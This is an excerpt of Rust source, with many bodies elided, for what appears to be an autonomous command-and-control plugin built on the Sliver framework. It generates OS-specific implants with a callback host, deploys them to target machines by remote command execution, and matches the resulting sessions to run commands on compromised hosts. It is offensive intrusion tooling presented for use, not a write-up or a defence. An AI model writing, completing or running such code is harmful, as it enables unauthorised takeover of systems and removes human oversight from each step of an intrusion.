...
impl SliverGrpcClient {
    async fn new(
        proxy_manager: &crate::utils::proxy::ProxyManager,
        server_addr: &str,
    ) -> Result<Self> {
        // --- V14.2 HARDENING: DNS Resolve & Pinning ---
        let addr = tokio::net::lookup_host(format!("{}:31337", server_addr))
            .await?
            .next()
    ...
    async fn execute_command(&self, session_id: &str, command: &str) -> Result<String> {
        ...
        let mut req = self
            .client
            .post(format!("{}/sessions/{}/execute", self.base_url, session_id))
            .json(&payload);
...
impl<M: ExecutorMode> C2Operator for SovereignSliverOperator<M> {
    async fn prepare_payload(&self, target: &TargetHost) -> Result<String> {
        ...
        info!(
            "🔱 SOVEREIGN: Generating autonomous implant for {} (OS: {})",
            target.host, target_os
        );

        let implant_path = client
            .generate_implant(&callback_host, target_os)
            .await
    ...
    async fn deploy_payload(&self, target: &TargetHost, payload_path: &str) -> Result<()> {
        info!(
            "🚀 SOVEREIGN: Initiating autonomous deployment to {}",
            target.host
        );
        ...
        self.executor
            .execute_remote(target, &deployment_cmd)
            .await
            ...
            if let Some(remote_addr) = session.get("RemoteAddress").and_then(|v| v.as_str()) {
                    ...
                    || (target.ip.is_some() && remote_addr.contains(target.ip.as_ref().unwrap()))
                {
                        ...
                        .and_then(|v| v.as_str())
                    {
                        ...
                        let op = crate::core::orchestrator::c2::typestate::SliverOperator::<
...
impl<M: ExecutorMode> ScannerPlugin for SovereignSliverOperator<M> {
    ...
    fn metadata(&self) -> crate::plugins::PluginMetadata {
        crate::plugins::PluginMetadata {
            ...
            description: "Sovereign Sliver C2 Operator: Autonomous gRPC-based session management"
                .to_string(),
